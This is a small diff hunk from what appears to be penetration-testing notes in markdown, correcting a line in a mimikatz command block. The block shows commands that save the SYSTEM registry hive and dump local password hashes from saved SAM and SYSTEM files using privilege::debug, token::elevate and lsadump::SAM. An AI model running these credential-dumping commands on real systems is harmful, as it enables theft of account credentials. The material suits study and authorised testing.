@@ -10,7 +10,7 @@ reg save HKLM\SYSTEM SystemBkup.hiv
 ```
 
 ```csharp
-mimikatz # privilege::debug Privilege
+mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::SAM /SAM:C:\Users\b3v1l\Desktop\SAM /SYSTEM:C:\Users\b3v1l\Desktop\SYSTEM
 ```
